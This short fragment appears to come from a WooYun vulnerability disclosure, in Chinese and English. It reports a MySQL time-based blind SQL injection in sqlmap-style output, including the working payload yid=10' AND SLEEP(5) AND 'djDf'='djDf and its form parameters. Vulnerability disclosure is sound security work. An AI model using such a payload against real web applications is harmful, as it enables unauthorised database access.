wybug_detail: 漏洞详情 披露状态： Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: yid=10' AND SLEEP(5) AND 'djDf'='djDf&con_id=17&exam_code=123123&name=123213&submit=---back-end DBMS: MySQL
